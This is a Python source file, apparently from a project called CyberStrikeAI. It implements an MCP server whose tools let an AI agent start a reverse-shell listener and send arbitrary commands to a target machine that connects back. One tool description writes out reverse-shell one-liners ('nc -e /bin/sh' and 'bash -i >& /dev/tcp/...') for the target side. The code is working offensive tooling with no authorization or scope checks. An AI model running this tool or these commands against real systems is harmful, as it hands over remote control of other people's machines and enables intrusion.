#!/usr/bin/env python3
"""
Reverse Shell MCP Server - a reverse-shell MCP service

Exposes reverse-shell capabilities over the MCP protocol: start/stop the listener, and interactively execute commands with a connected client.
No change to the CyberStrikeAI backend is needed; add it via stdio under "Settings -> External MCP".

Dependencies: pip install mcp (or use the project venv)
Run: python mcp_reverse_shell.py  or  python3 mcp_reverse_shell.py
"""

from __future__ import annotations

import asyncio
import socket
import threading
import time
from typing import Any

from mcp.server.fastmcp import FastMCP

# ---------------------------------------------------------------------------
# Reverse-shell state (singleton: one listener, one connected client)
# ---------------------------------------------------------------------------

_LISTENER: socket.socket | None = None
_LISTENER_THREAD: threading.Thread | None = None
_LISTENER_PORT: int | None = None
_CLIENT_SOCK: socket.socket | None = None
_CLIENT_ADDR: tuple[str, int] | None = None
_LOCK = threading.Lock()
_STOP_EVENT = threading.Event()
_READY_EVENT = threading.Event()
_LAST_LISTEN_ERROR: str | None = None
_LISTENER_THREAD_JOIN_TIMEOUT = 1.0
_START_READY_TIMEOUT = 1.5

# Output end marker for send_command (to avoid waiting forever)
_END_MARKER = "__RS_DONE__"
_RECV_TIMEOUT = 30.0
_RECV_CHUNK = 4096


def _get_local_ips() -> list[str]:
    """Get the list of local IPs (for the target machine to connect back to), preferring non-127 addresses."""
    ips: list[str] = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and ip != "127.0.0.1":
            ips.append(ip)
    except OSError:
        pass
    if not ips:
        try:
            ip = socket.gethostbyname(socket.gethostname())
            if ip:
                ips.append(ip)
        except OSError:
            pass
    if not ips:
        ips.append("127.0.0.1")
    return ips


def _accept_loop(port: int) -> None:
    """In a background thread: bind, listen, accept - accepting only one client."""
    global _LISTENER, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LAST_LISTEN_ERROR
    sock: socket.socket | None = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", port))
        sock.listen(1)
        # Avoid accept() not returning for a long time after stop_listener closes: poll the stop event with a timeout
        sock.settimeout(0.5)
        with _LOCK:
            _LISTENER = sock
            _LISTENER_PORT = port
            _LAST_LISTEN_ERROR = None
            _READY_EVENT.set()
        # Accept loop: accept only one connection, or wait for the stop event
        while not _STOP_EVENT.is_set():
            try:
                client, addr = sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with _LOCK:
                _CLIENT_SOCK = client
                _CLIENT_ADDR = (addr[0], addr[1])
            break
    except OSError as e:
        with _LOCK:
            _LAST_LISTEN_ERROR = str(e)
            _READY_EVENT.set()
    finally:
        with _LOCK:
            _LISTENER = None
            _LISTENER_PORT = None
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def _start_listener(port: int) -> str:
    global _LISTENER_THREAD, _LISTENER_PORT, _CLIENT_SOCK, _CLIENT_ADDR, _LAST_LISTEN_ERROR
    old_thread: threading.Thread | None = None
    with _LOCK:
        if _LISTENER is not None:
            # _LISTENER_PORT may briefly be None (e.g. just after stop/start), so provide a fallback display
            show_port = _LISTENER_PORT if _LISTENER_PORT is not None else port
            return f"Already listening (port: {show_port}); please stop_listener first and then start again."
        if _CLIENT_SOCK is not None:
            try:
                _CLIENT_SOCK.close()
            except OSError:
                pass
            _CLIENT_SOCK = None
            _CLIENT_ADDR = None
        old_thread = _LISTENER_THREAD

    # If the old thread has not fully exited, wait briefly to reduce the chance of a port-bind failure
    if old_thread is not None and old_thread.is_alive():
        old_thread.join(timeout=0.5)

    _STOP_EVENT.clear()
    _READY_EVENT.clear()
    _LAST_LISTEN_ERROR = None
    th = threading.Thread(target=_accept_loop, args=(port,), daemon=True)
    th.start()
    _LISTENER_THREAD = th

    # Wait for the background thread to finish bind/listen (or fail)
    _READY_EVENT.wait(timeout=_START_READY_TIMEOUT)
    with _LOCK:
        err = _LAST_LISTEN_ERROR
        listening = _LISTENER is not None

    if listening:
        ips = _get_local_ips()
        addrs = ", ".join(f"{ip}:{port}" for ip in ips)
        return (
            f"Started listening on 0.0.0.0:{port}."
            f"The target machine should connect back to: {addrs} (choose any one). After connecting, use reverse_shell_send_command to execute commands."
        )

    if err:
        return f"Failed to start listening (0.0.0.0:{port}): {err}"

    # Still not ready: possibly slow thread scheduling or an abnormal environment; give an actionable hint
    return f"Listening start not confirmed (0.0.0.0:{port}). Please call reverse_shell_status to confirm, or retry later."


def _stop_listener() -> str:
    global _LISTENER, _LISTENER_THREAD, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT
    listener_sock: socket.socket | None = None
    client_sock: socket.socket | None = None
    old_thread: threading.Thread | None = None
    with _LOCK:
        _STOP_EVENT.set()
        _READY_EVENT.set()
        listener_sock = _LISTENER
        old_thread = _LISTENER_THREAD
        _LISTENER = None
        _LISTENER_PORT = None
        client_sock = _CLIENT_SOCK
        _CLIENT_SOCK = None
        _CLIENT_ADDR = None

    if listener_sock is not None:
        try:
            listener_sock.close()
        except OSError:
            pass
    if client_sock is not None:
        try:
            client_sock.close()
        except OSError:
            pass

    # Wait for the listening thread to exit, to avoid a stop/start race causing "port None still says already listening"
    if old_thread is not None and old_thread.is_alive():
        old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
    with _LOCK:
        _LISTENER_THREAD = None
    return "Listening stopped; the current client (if any) has been disconnected."


def _disconnect_client() -> str:
    global _CLIENT_SOCK, _CLIENT_ADDR
    with _LOCK:
        if _CLIENT_SOCK is None:
            return "There is no connected client right now."
        try:
            _CLIENT_SOCK.close()
        except OSError:
            pass
        addr = _CLIENT_ADDR
        _CLIENT_SOCK = None
        _CLIENT_ADDR = None
    return f"Disconnected client {addr}."


def _status() -> dict[str, Any]:
    with _LOCK:
        listening = _LISTENER is not None
        port = _LISTENER_PORT
        connected = _CLIENT_SOCK is not None
        addr = _CLIENT_ADDR
    connect_back = None
    if listening and port is not None:
        ips = _get_local_ips()
        connect_back = [f"{ip}:{port}" for ip in ips]
    return {
        "listening": listening,
        "port": port,
        "connect_back": connect_back,
        "connected": connected,
        "client_address": f"{addr[0]}:{addr[1]}" if addr else None,
    }


def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
    """In a synchronous context, send a command to the connected client and read the output (with an end marker)."""
    global _CLIENT_SOCK, _CLIENT_ADDR
    with _LOCK:
        client = _CLIENT_SOCK
    if client is None:
        return "Error: there is no connected client right now. Please start_listener first, wait for the target to connect, and then send_command."
    # Use an end marker to reliably truncate the output
    wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
    try:
        client.settimeout(timeout)
        client.sendall(wrapped.encode("utf-8", errors="replace"))
        data = b""
        while True:
            try:
                chunk = client.recv(_RECV_CHUNK)
                if not chunk:
                    break
                data += chunk
                if _END_MARKER.encode() in data:
                    break
            except socket.timeout:
                break
        text = data.decode("utf-8", errors="replace")
        if _END_MARKER in text:
            text = text.split(_END_MARKER)[0].strip()
        return text or "(no output)"
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        with _LOCK:
            if _CLIENT_SOCK is client:
                _CLIENT_SOCK = None
                _CLIENT_ADDR = None
        return f"Connection closed: {e}"
    except Exception as e:
        return f"Execution error: {e}"


# ---------------------------------------------------------------------------
# MCP service and tools
# ---------------------------------------------------------------------------

app = FastMCP(
    name="reverse-shell",
    instructions="Reverse-shell MCP: start a TCP listener locally, wait for the target machine to connect, and then execute commands via the tools.",
)


@app.tool(
    description="Start a reverse-shell listener on the specified port. The target machine must make a reverse connection (such as nc -e /bin/sh YOUR_IP PORT or bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1). Only one listener and one client are supported.",
)
def reverse_shell_start_listener(port: int) -> str:
    """Start reverse shell listener on the given port (e.g. 4444)."""
    if port < 1 or port > 65535:
        return "The port must be between 1 and 65535."
    return _start_listener(port)


@app.tool(
    description="Stop the reverse-shell listener and disconnect the current client.",
)
def reverse_shell_stop_listener() -> str:
    """Stop the listener and disconnect the current client."""
    return _stop_listener()


@app.tool(
    description="View the current status: whether it is listening, the port, whether a client is connected, and the client address.",
)
def reverse_shell_status() -> str:
    """Get listener and client connection status."""
    s = _status()
    lines = [
        f"Listening: {s['listening']}",
        f"Port: {s['port']}",
        f"Connect-back address (for the target to connect): {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
        f"Connected: {s['connected']}",
        f"Client: {s['client_address'] or '-'}",
    ]
    return "\n".join(lines)


@app.tool(
    description="Send one command to the connected reverse-shell client and return the output. If there is no connection, start_listener first and wait for the target to connect.",
)
async def reverse_shell_send_command(command: str) -> str:
    """Send a command to the connected reverse shell client and return output."""
    # Run the blocking socket I/O in a thread pool, to avoid occupying the MCP main thread for a long time so that status/stop_listener etc. remain responsive
    return await asyncio.to_thread(_send_command_blocking, command)


@app.tool(
    description="Only disconnect the current client, without stopping the listener (it can keep waiting for a new connection).",
)
def reverse_shell_disconnect() -> str:
    """Disconnect the current client without stopping the listener."""
    return _disconnect_client()


if __name__ == "__main__":
    app.run(transport="stdio")
